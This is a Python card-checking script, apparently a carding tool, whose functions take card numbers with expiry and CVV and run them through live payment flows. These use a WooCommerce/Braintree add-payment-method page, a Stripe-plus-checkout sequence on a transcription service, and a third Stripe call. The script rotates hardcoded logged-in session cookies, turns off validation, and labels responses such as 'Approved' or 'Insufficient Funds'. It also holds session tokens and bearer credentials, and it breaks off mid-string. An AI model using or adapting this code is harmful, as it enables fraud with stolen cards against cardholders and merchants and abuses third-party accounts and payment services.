#pylint:disable=E0001
import os

try:
    import pyfiglet, webbrowser, user_agent, time
    import requests
    import re
    import base64
    import random
    import string
    
except ImportError as e:
    print("حدث خطأ في استدعاء مكتبة:", e)
    print("يتم تثبيت المكتبات...")
    os.system('pip install pyfiglet user_agent requests')
    import pyfiglet
    import webbrowser
    import user_agent
    import time
    import requests
    import re
    import base64
    import random
    import string
    import requests

def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	with open('fileb3.txt', 'r') as file:
		first_line = file.readline()
	while True:
		lines='''ndkdnb85%7C1723317636%7CvVPl19v3RNBK91jtfonzmwFIXVmLsVEdusYnZsPcoAs%7C4e19be7217c9b46dce262db73c83c76484c3587afcf921fd93ae835d15cec046 dndkdnj97%7C1723317837%7CWYIQyuXPmiV9Avn47pmDxNAhadvtUx2UFANfC4yfirI%7Ccb674fd80c9a0284bac6e5c006def4fec50a4a21d6afc06591ae12a79db6971 bdjdn75%7C1723318045%7CjgvNRh4O2SVuzPvbkJd41x1kokRWJ7XnV6PHmuHpa5y%7C14df3b28b7dfce68ce055346992f4a752d6f1db4a470a42e74c77f20de619672'''
		lines = lines.strip().split('\n')
		random_line_number = random.randint(0, len(lines) - 1)
		big = lines[random_line_number]
		if big == first_line:
			pass
		else:
			break
	with open('fileb3.txt', 'w') as file:
		file.write(big)
	cookies = {
	    '_ga': 'GA1.1.774315979.1711878714',
	    '_gcl_au': '1.1.169795609.1711878714',
	    'wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d': big,
	    'wfwaf-authcookie-8288059899a58842f2727962646eba72': '2451%7Cother%7Cread%7C61ed8c290d2bf7186e5b6f5cec774f0c6c1594b849562370e6447a4b8b83ccf7',
	    '_ga_J890L8ECJX': 'GS1.1.1711878714.1.1.1711878997.57.0.0',
	}
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'Connection': 'keep-alive',
	    # 'Cookie': '_ga=GA1.1.774315979.1711878714; _gcl_au=1.1.169795609.1711878714; wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d=visaspam77%7C1713088332%7Co1IP7tiJpkipfh2yKngvFR4oLuT02D2yLAOwRwGqmDb%7C56bf1ba7db092a0773b738a06eb7fa15b4ffd017038a897c08ef6a9a94812ab2; wfwaf-authcookie-8288059899a58842f2727962646eba72=2451%7Cother%7Cread%7C61ed8c290d2bf7186e5b6f5cec774f0c6c1594b849562370e6447a4b8b83ccf7; _ga_J890L8ECJX=GS1.1.1711878714.1.1.1711878997.57.0.0',
	    'Referer': 'https://www.huntingtonacademy.com/my-account/payment-methods/',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'same-origin',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	response = requests.get('https://www.huntingtonacademy.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)	
	enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
	dec = base64.b64decode(enc).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '698e6aaa-6b50-4bf0-adc4-d454c57ef68a',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	                'billingAddress': {
	                    'postalCode': '11743',
	                    'streetAddress': '',
	                },
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"698e6aaa-6b50-4bf0-adc4-d454c57ef68a"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4304512200105020","expirationMonth":"10","expirationYear":"2028","cvv":"323","billingAddress":{"postalCode":"11743","streetAddress":""}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
	#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	import requests
	
	cookies = {
	    '_ga': 'GA1.1.774315979.1711878714',
	    '_gcl_au': '1.1.169795609.1711878714',
	    'wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d': big,
	    'wfwaf-authcookie-8288059899a58842f2727962646eba72': '2451%7Cother%7Cread%7C61ed8c290d2bf7186e5b6f5cec774f0c6c1594b849562370e6447a4b8b83ccf7',
	    '_ga_J890L8ECJX': 'GS1.1.1711878714.1.1.1711878764.10.0.0',
	}
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'Cache-Control': 'max-age=0',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    # 'Cookie': '_ga=GA1.1.774315979.1711878714; _gcl_au=1.1.169795609.1711878714; wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d=visaspam77%7C1713088332%7Co1IP7tiJpkipfh2yKngvFR4oLuT02D2yLAOwRwGqmDb%7C56bf1ba7db092a0773b738a06eb7fa15b4ffd017038a897c08ef6a9a94812ab2; wfwaf-authcookie-8288059899a58842f2727962646eba72=2451%7Cother%7Cread%7C61ed8c290d2bf7186e5b6f5cec774f0c6c1594b849562370e6447a4b8b83ccf7; _ga_J890L8ECJX=GS1.1.1711878714.1.1.1711878764.10.0.0',
	    'Origin': 'https://www.huntingtonacademy.com',
	    'Referer': 'https://www.huntingtonacademy.com/my-account/add-payment-method/',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'same-origin',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	data = {
	    'payment_method': 'braintree_cc',
	    'braintree_cc_nonce_key': tok,
	    'braintree_cc_device_data': '{"device_session_id":"d5e97ccc9f799eb2267d322e412447c7","fraud_merchant_id":null,"correlation_id":"337df1cb3591edc6154038e002f7aa88"}',
	    'braintree_cc_3ds_nonce_key': '',
	    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/88yh4wp5qmm383vy/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/88yh4wp5qmm383vy"},"merchantId":"88yh4wp5qmm383vy","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"payWithVenmo":{"merchantId":"3184501200456253861","accessToken":"access_token$production$88yh4wp5qmm383vy$046fed997ac2817cff08e18b6195f802","environment":"production"},"paypalEnabled":true,"paypal":{"displayName":"Huntington Academy of Permanent Cosmetics","clientId":"AVSrt_PxsQbUo8i9Vf3OcqThKuBqMkQGg-hRLlnTHO9r55agBf5KosAkmqFdhrjvnX-iVNe6p3miaPmP","privacyUrl":null,"userAgreementUrl":null,"assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"huntingtonacademyofpermanentcosmetics_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
	    'woocommerce-add-payment-method-nonce': add_nonce,
	    '_wp_http_referer': '/my-account/add-payment-method/',
	    'woocommerce_add_payment_method': '1',
	}
	
	response = requests.post(
	    'https://www.huntingtonacademy.com/my-account/add-payment-method/',
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
	else:
		if 'Payment method successfully added.' in text:
			result = "1000: Approved"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			result = "try again"
		else:
			result = "Error"
			print('er#')
	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
		return 'Approved'
	else:
		return result




def ch(ccx):
	import time
	ccx=ccx.strip()
	c = ccx.split("|")[0]
	mm= ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	time.sleep(3)
	headers = {
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'Accept': 'application/json',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Referer': 'https://js.stripe.com/',
    'sec-ch-ua-mobile': '?1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform': '"Android"',
}

	data = f'type=card&billing_details[name]=yusuf&card[number]={c}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=ec00e8d1-c512-4053-9a01-45f02b22c6ebd05330&muid=070b51ab-af54-48a9-9bb3-c839cf612ad9cc2d12&sid=e5761279-6e4b-4a94-b9d0-6a2912f6be1b9e3827&payment_user_agent=stripe.js%2F7c4530bc8b%3B+stripe-js-v3%2F7c4530bc8b%3B+split-card-element&referrer=https%3A%2F%2Fwww.happyscribe.com&time_on_page=34223&key=pk_live_cWpWkzb5pn3JT96pARlEkb7S&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZpWIzvedNJimC2YmM8_PHpVj87TDHfiH02_eX3K9jRXaXJxrvwEb8Y7VpbrJgW2Uw3JptNsHwRtULWdnkSqoRIFNivY4LsCnvYk1hsu7cKNDnJeo-mw07tkf0Ypx9pvBUz3xsjeKGP-CuXddiYGXT-bXj0kFr2Hs2fBRVaNxYqIT7CEUTLZRwueaZxlnbeEHGFCoedQyBCmOjMWOafo7onF1xSfEFyBQ2PCpRBfWQoIctfufn9AHodQ7-t2dg_xRGmPT1-BO8jVYFRDPBu7uRXG_Oeo7WZdXDZWHJQ54Vt55o1fao8V1E9BMHZxnfS70Yya9ANWNE4WlrZxHTP41C3OHPQSvMPxHN-6Lr5-9fhqxH6UQICAes_etb5Zl_E_UykxYut38NfKxKD7g5TsSGmBbOyU-jerng3x0T9NoiDOY5vUja0zeLQ0xAuz6BJWm_G_IxxCuKvFjFEfFwjyGbcXW9i-L0ACHGgyJiCfxXWRoBtip30C8SoxFIUYqlZx4WtcW9L-pK5JWeSS_vAUne-IvX7tyOyola8PkwqTUW_wIh2D9-8lADvQKs8KH1_OcHv39uH37IN8Ts0S4Je59tAuMypYeVGzBIN3v0EGolQ8HD0VwZfHRZ645EdhhvUXB1_aJogVbEOLsk8aENk8WpuI_vi7dRHWUGkvQFwoj7cpAecUoxefMdvg_zKVMrMaTUZuYzWgQa6j96YXt-zE5xxGq4sT73NwxagxVgnCA4yOTw2RraNCoAqCA8XIUpaXVBasOSHvhtUR9v1M9ue8Jxs9QGxMxY3mBfLAqY2XqZZbFoPGB5Qa18RkzgblYmQloGM_eMHvN-9uhAVWn959EKc-RirNyhwnS3lTVbfQFc7CFUB1RZqWdWu25XXujsZ5-0G-RO0fu06MV4Q3W8sm5KzmnZubeuBhC1VtODqSxpgg0JW7amEzn_WnfCP73AkrORBkzKmD-JQdFJyNuFAmyrUbrQ3KR1cLFTU9k4UcWnMuqXiwLD8LWsjWXDGM-o377wntT2917rEYW78_P9PXBF1AlkMzNka8Bwaz7SS_1iaejWGllLBqpPZNB_8Pv3LGNffMHitNHF7MlGuhmLRi0U7bhKiJpEMI_3EunTiJSgM0R037L4H5L0HJWtKdUNz78fNh5eVSF5xhDN6K401ZROE3IoZL-0YCPhtEFD567_TWUlEo7dwI6MxrH8Og1npa-5iA03EM42vPSUvLZGWZ6AhVV6n9LOlTETR40ResvEOIBDQeENUFQMYqr2-V5_NYjAClNK9MvLGVNE_cg9QbNCcHxkSEoL919SdUQ8EqB0Ow8SNpeHOc6fIcFrKbw0E_duLBrlnTkQFHIr9LfWHmUf7MRb7O7ZpxX1whMzNNmheBiFgeU0Wk0RJwdcH9qdrnkH-xe1zWHDTZFRHZu9rsAnmU0GZvc3RKZCBgTQKD57X9BeFXQ0vfGN7K0cKTnCXD6RbJolbNy74CCGwQiYwSxFpNLLLMD4FvsNxrzIQkDS_Tje9KCnRo-mbHWSuGowCbxPp0zLPgIAys0_lgob_qY_m8TfLVskY7Rws-TguaK3lyyTTxci7lR6QjaBkqujDgSED7eGiVSLbdj5K5VxnABnNhMDyeh6KnnDU1dQKK_BjHh6uNipam8Cvd4UaBl7vt-enozGGri6o8_sMsWJzTSmqIh9D2rhj5uU_yDXVujGfLjsEVxb0Pl8ckSwlMProPj3qUQlPZxtHa7qJKZLukl6n2F_hL6SZrl2_RqLDCGdNca0ihRNbTCwJ3h0WZ0wrx11S9ivTyXCqAr4N2GwGapFNZl-0YFiAoPlzThcmg9--KQGimYsXYlPT0EBlmQgjpPaCDVZEttOXzHORebYZenwFBliFQ74N1Ywe7XfKaPpdYgQt_iz1JhG60T0f_bl4CPPVnfAmqCyJyb6PtZ_l1Q4GH0zHhJZOcW4ZCox6OQaSEEbTUDzX9Ym8fF4qS3gbmcK8hURrxDd35DbkEnIaCiJ6Wp7Z4myYhUBuQRhmptEGyDbeG7esmKDOMm1t8lUibYVdBXKOfVsCALfTfdTKMvSTkrO1vZsY8OVz6H0aJVtd5EQ1F2vwh1FmK4Shh99PVe8NYuuD875zQWZQ5G_SVAPsZbrDHmmhnyHD-_B7de4yKiKxGnlcFQNmHhNyW5wqqZFmxByXs63V8kW7o2V4cM5mNsJAqHNoYXJkX2lkzhQ8hB-ia3KoMWYzNDEzYzWicGQA.Ve3_iKk831BYCZnTHmuJClr2wfupKYsq57OLjjs5Txs'

	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	ide=response.json()['id']
	cookies = {
    'ahoy_visitor': '9e6a40b7-decd-48d5-9f8d-17eb71b447b2',
    'remember_user_token': 'eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3hNakF3T1RrNU4xMHNJalIyWjNCT1ltZHJWR2REY1ZFMVdIbHpZakpFSWl3aU1UY3hOamczT0RVNU55NDVOVEF6T0RBeklsMD0iLCJleHAiOiIyMDI0LTA2LTA0VDA2OjQzOjE3Ljk1MFoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--9de9be21204a15255de7267857f5b4173576332f',
    'unsecure_is_signed_in': '1',
    'cc_cookie': '%7B%22categories%22%3A%5B%22necessary%22%2C%22analytics%22%2C%22marketing%22%5D%2C%22revision%22%3A0%2C%22data%22%3Anull%2C%22consentTimestamp%22%3A%222024-05-28T06%3A43%3A23.433Z%22%2C%22consentId%22%3A%2262fc216f-df44-47fb-ac7b-b57041b6c70c%22%2C%22services%22%3A%7B%22necessary%22%3A%5B%5D%2C%22analytics%22%3A%5B%5D%2C%22marketing%22%3A%5B%5D%7D%2C%22lastConsentTimestamp%22%3A%222024-05-28T06%3A43%3A23.433Z%22%7D',
    '_gcl_au': '1.1.692315671.1716878603',
    'intercom-device-id-frdatdus': '2c8a6d60-3354-4ff1-b9df-1bceb6152d76',
    '__stripe_mid': '68f72840-ad04-4025-8fab-3f9d8fd9c1d8b7a23d',
    '_cioid': '12009997',
    'ahoy_visit': 'a471fd48-46d0-4be5-b432-e79d47bf65d1',
    '_ga': 'GA1.2.1541740028.1716878601',
    '_gid': 'GA1.2.1473912494.1717088350',
    '_ga_4T8KCV9Y2D': 'GS1.1.1717088350.6.1.1717088405.5.0.0',
    'intercom-session-frdatdus': 'WEtLdlIxeUtLSjZXQnFvY0JzOHJpR3pxUW0vTEFkVjd4VnJjNHRWSzRXMnZzQVJoY2Jqcjg3c2NRUkRSYTVNUi0tTTNzeG9oV1hhRGdFWlVJSkVoQ3YrUT09--33b009d2bec74f6e465a898f9cfd06fb80974b06',
    '_transcribe_session': '5xjPwnOHAii1bK%2BYOp5i0UDiK70x05sR935QTHUQZP6JcYYlwJrfEVrEJ5CctiLXTKBKWn%2BOtsoCWLU280xj5Pja18yxyKiUqYU9N1%2BcMAWNlagUb8hVwq5eRelsI%2FKgFLpdYtwgaeg1FzgjYLDrMxDV4VHTQVPHxNmk2%2F0MPpmUYC8mpnqWbOEVnCNfANfCH21cYwxSRGn0DRCbX%2FGO3%2F5RvD6hW6G28eBbsiRJQBHoViHNh1G%2Flz0QwPIPeM2sJ3Uw6B5JSuXmNVf%2B2yL3hHl4%2BTb%2Fl37I5DoRS5pg6sZmzoeNSdVB95BD78xnZjGsSJZINMWUmUv4aNMyk1WFWsZ%2Fr2%2FFKy9kuTLlPLwub7kh%2BUBVPSE%2Fr1fGmhJR%2BoPjpz3QFh9u6Sy874gkf9DhGPh1KA%3D%3D--GQEnaiTaieDhXbHE--JVt0gBaiNPmzEc6snTZZAg%3D%3D',
}

	headers = {
    'accept': 'application/json',
    'accept-language': 'ar,en;q=0.9,en-US;q=0.8',
    'authorization': 'Bearer wN76rvX5Rblg3yh2dklWuAtt',
    'content-type': 'application/json',
    # 'cookie': 'ahoy_visitor=9e6a40b7-decd-48d5-9f8d-17eb71b447b2; remember_user_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3hNakF3T1RrNU4xMHNJalIyWjNCT1ltZHJWR2REY1ZFMVdIbHpZakpFSWl3aU1UY3hOamczT0RVNU55NDVOVEF6T0RBeklsMD0iLCJleHAiOiIyMDI0LTA2LTA0VDA2OjQzOjE3Ljk1MFoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--9de9be21204a15255de7267857f5b4173576332f; unsecure_is_signed_in=1; cc_cookie=%7B%22categories%22%3A%5B%22necessary%22%2C%22analytics%22%2C%22marketing%22%5D%2C%22revision%22%3A0%2C%22data%22%3Anull%2C%22consentTimestamp%22%3A%222024-05-28T06%3A43%3A23.433Z%22%2C%22consentId%22%3A%2262fc216f-df44-47fb-ac7b-b57041b6c70c%22%2C%22services%22%3A%7B%22necessary%22%3A%5B%5D%2C%22analytics%22%3A%5B%5D%2C%22marketing%22%3A%5B%5D%7D%2C%22lastConsentTimestamp%22%3A%222024-05-28T06%3A43%3A23.433Z%22%7D; _gcl_au=1.1.692315671.1716878603; intercom-device-id-frdatdus=2c8a6d60-3354-4ff1-b9df-1bceb6152d76; __stripe_mid=68f72840-ad04-4025-8fab-3f9d8fd9c1d8b7a23d; _cioid=12009997; ahoy_visit=a471fd48-46d0-4be5-b432-e79d47bf65d1; _ga=GA1.2.1541740028.1716878601; _gid=GA1.2.1473912494.1717088350; _ga_4T8KCV9Y2D=GS1.1.1717088350.6.1.1717088405.5.0.0; intercom-session-frdatdus=WEtLdlIxeUtLSjZXQnFvY0JzOHJpR3pxUW0vTEFkVjd4VnJjNHRWSzRXMnZzQVJoY2Jqcjg3c2NRUkRSYTVNUi0tTTNzeG9oV1hhRGdFWlVJSkVoQ3YrUT09--33b009d2bec74f6e465a898f9cfd06fb80974b06; _transcribe_session=5xjPwnOHAii1bK%2BYOp5i0UDiK70x05sR935QTHUQZP6JcYYlwJrfEVrEJ5CctiLXTKBKWn%2BOtsoCWLU280xj5Pja18yxyKiUqYU9N1%2BcMAWNlagUb8hVwq5eRelsI%2FKgFLpdYtwgaeg1FzgjYLDrMxDV4VHTQVPHxNmk2%2F0MPpmUYC8mpnqWbOEVnCNfANfCH21cYwxSRGn0DRCbX%2FGO3%2F5RvD6hW6G28eBbsiRJQBHoViHNh1G%2Flz0QwPIPeM2sJ3Uw6B5JSuXmNVf%2B2yL3hHl4%2BTb%2Fl37I5DoRS5pg6sZmzoeNSdVB95BD78xnZjGsSJZINMWUmUv4aNMyk1WFWsZ%2Fr2%2FFKy9kuTLlPLwub7kh%2BUBVPSE%2Fr1fGmhJR%2BoPjpz3QFh9u6Sy874gkf9DhGPh1KA%3D%3D--GQEnaiTaieDhXbHE--JVt0gBaiNPmzEc6snTZZAg%3D%3D',
    'origin': 'https://www.happyscribe.com',
    'priority': 'u=1, i',
    'referer': 'https://www.happyscribe.com/v2/11515877/checkout?new_subscription_interval=month&plan=basic_2023_05_01&step=billing_details',
    'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
}

	json_data = {
    'id': 11194949,
    'address': 'Los Aeles',
    'name': 'mazen Games',
    'country': 'US',
    'vat': None,
    'billing_account_id': 11194949,
    'last4': '3063',
    'orderReference': 'hcktezggtr',
    'user_id': 12009997,
    'organization_id': 11515877,
    'hours': 0,
    'balance_increase_in_cents': None,
    'payment_method_id': ide,
    'transcription_id': None,
    'plan': 'basic_2023_05_01',
    'order_id': None,
    'recurrence_interval': 'month',
    'extra_plan_hours': None,
}

	req = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, json=json_data)
	print(req.json()['error'])
	if 'Retry later' in req.text:
		ms = 'risk'
		return ms
		time.sleep(15)
	try:
		msg = req.json()['error']
		print(ccx,'¦',msg)
		if "Your card has insufficient funds." in req.json()['error']:
			ms = 'Your card has insufficient funds.'
			return ms
		else:
			ms = req.json()['error']
			return ms
	except:
		if 'requires_action' in req.json():
			ms = '3D Required'
			return ms
		else:
			return req.json()
	
#Strip CH	
	
def sp(ccx):
	ccx=ccx.strip()
	cc = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]


	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&billing_details[name]=Gggg+Vvvv&billing_details[address][line1]=49+Featherstone+Street&billing_details[address][city]=London&billing_details[address][postal_code]=EC1Y+8SY&billing_details[address][country]=GB&billing_details[email]=gvvvv7277%40gmail.com&billing_details[phone]=447947570472&card[number]={cc}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=0a2fc1b7-6e03-4aaf-afbe-80d0de48133176f439&muid=c99397cf-583a-4115-a9c6-682e05510842e3b4bc&sid=ea7cccb0-9998-4c18-bb4d-791e7badfcbc96a37e&pasted_fields=number&payment_user_agent=stripe.js%2Ffe2e2c5c10%3B+stripe-js-v3%2Ffe2e2c5c10%3B+split-card-element&referrer=https%3A%2F%2Fdelspets.com&time_on_page=66920&key=pk_live_51KgrZhFpdSeGohWQRpF1iY5THVYykqqhxdNGnipZXsZqSFl1l6HDjImKFjhYtN1DcIAEHN27WTNTgCV2M30nudzC00KLcw2nBS&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQY6o7MOIzRQunN7M6UGCPRecA9Xfs5gaME83AC7Z75P4EHUi14lpJhv-fdtaAnbm3_t0lQ9-0DmZZCMjzOtfXhF0LmuNKktG6sdykJYSFJfhUcxdL_RWFj7expS8CNSWmRkVXRsZfVVSXRQG56anP6SQ_BfLQYsb77t83_fy3-9QT9WVPc5neOjk_ADqNtkAWmANWUAZ-oGmE3PXKlsSURdYD9pN8XXAyCz7tRETUYh_LdUuZxhi2qh7oGvheqntM1fSQVqpux28iOajrWCV5etgLVoe8Dp3YNz6-IkwEf9IPgakI4d_7VIv2eQUvahbd3Jr8-S-zPdA0IWQHixzTHrXICKMgQpdQEy4uR6Rexuj6dzxbIp7oRMdPTiVa7V3JiO4J2q-w8ZU4-RcfodNBln0bmgHkZOToWeuVHkgk4DLlWRtfqLNlJ_I-gmb_RFGFfJdLy549qVMK0oqt7UXWUFPNfIvIGxGu1pQoPjmfLFg0ajvjpfoKJ1wSMfOu2H5JGSPKeOxvkOuDrChCtDpxf_2sbm4A09wZSxZcCJTTR2dFLuRbkF5BZDaHpaJ-HqIFJLN9g8bDTvB7628-qomDY8hYtlJvt8tAfEBI2U2PovHE8nws6hq-wZmz9Y1SmEPHSIbnEbpFHHcEYH0sX0K_teabq9HRjG5KMG60y11tLgRTGcWDRq_AAKSWUhMzSRCS8yWJZwSbG1ryAC0NPzOpzhlbNLoPcb2IC4bfy9J6fUZOEI50gF0FNZi_2btDELLpdfBUIQE7SExdcurAABnokI7qcLbjs6ApsKl38eZAiQ8VLj9UaQ17hrqFhwQ7QHf_qrXDo2-RArzlDIAg1XRJWhQLrg9y5fL5-lOwF4MMjxZqZiS8jHpnB6b8gltwzb6xcA4D1LDhQEPquCdxwa_q6txc01UbGEvZkOAB4fQBnv5vJvOCNF2tJE7Ev-hHfsuXC4HVTz57E_iQ6X_OKBppe0nj4r8MujQ2cI06-_Gr8D0QQkPM5Eh5TYBgEGajKOp1IYdPmfSl3BifCNimzoNC41ud9YLQw2He-emb8tkXsz-H4esJT4cuNX36xktnTOSQhxOBe27rYckYS-F_9CoAWr_k9UlioRBgFIxp3GJfKGI97HEn3V8X89wI8Yp2O8fAH7DAMU4pvvkfSAPYDCbPQpUS5yZEZXu7_JSkXTIo407DFFQDfcO7AFWKmIdTigIdL_VwfyfOkxIQ3ulh6GUGULBWk8t1XSfUjTubhWk1LPVW8XTmoHo9UH-MUAUqPsuemVAcsKeotMbjZorL3ggQqzP4DOhyj-uTS8p52sB5ZREFZpgEUK0AuTgnoNILBToLe7TW-RhlRAGeeVyaQ3pfUhvJDn-Zzwwn2r0IL1P5p6xHl8z1lrIrlsOUSY7QJmHZpu6k75VJ3vzTRALknBQVmxOtBNkhGBf6lJ5lP29g-CN7eH6aHber9Yr7driWpN2LVDyec-GSYN9As85nQtfB_nV14HDkjTZgVywt5U0kydZDCwqM--H2l4RuHc0IRwnKdNojLAp